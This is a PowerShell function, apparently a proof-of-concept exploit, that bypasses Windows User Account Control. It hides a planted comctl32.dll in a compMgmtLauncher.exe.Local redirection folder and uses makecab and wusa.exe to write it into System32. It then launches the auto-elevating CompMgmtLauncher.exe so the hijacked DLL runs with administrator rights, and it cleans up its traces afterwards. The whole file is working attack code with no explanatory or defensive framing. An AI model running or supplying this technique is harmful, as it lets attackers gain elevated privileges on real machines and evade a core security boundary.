function invoke-compMgmtLauncher{

   $file = "\comctl32.dll"
   $path = "$HOME\Desktop"
   $evil = $(echo $path$file)
   $dst = $(echo "$evil.cab")
   
   #Create Directory
   mkdir $path\compMgmtLauncher.exe.Local
   $path1 =  "$path\compMgmtLauncher.exe.Local"
   mkdir $path1\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2
   $path = "$path1\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2"
   cp $evil $path
   
   #Create DDF File
   $texto = ".OPTION EXPLICIT       
 
    .Set CabinetNameTemplate=mycab.CAB
    .Set DiskDirectoryTemplate=.
     
    .Set Cabinet=on
    .Set Compress=on

    .Set DestinationDir=compMgmtLauncher.exe.Local\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2
    ""compMgmtLauncher.exe.Local\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\comctl32.dll"""

    $MyPath = "C:\Users\IEUser\Desktop\proof.ddf"
    $texto | Out-File -Encoding "UTF8" $MyPath
   
   #CAB File
   cd $HOME\Desktop
   makecab.exe /f $MyPath
   rm $MyPath\setup*
   
   #WUSA Copy
   wusa.exe $HOME\Desktop\mycab.CAB /extract:c:\Windows\System32 
   
   #Run Process
   Start-Process C:\Windows\system32\CompMgmtLauncher.exe
   
   #Remove folder and CAB file
   rm $HOME\Desktop\mycab.CAB
   rm -Force $path1 -Recurse
  
}
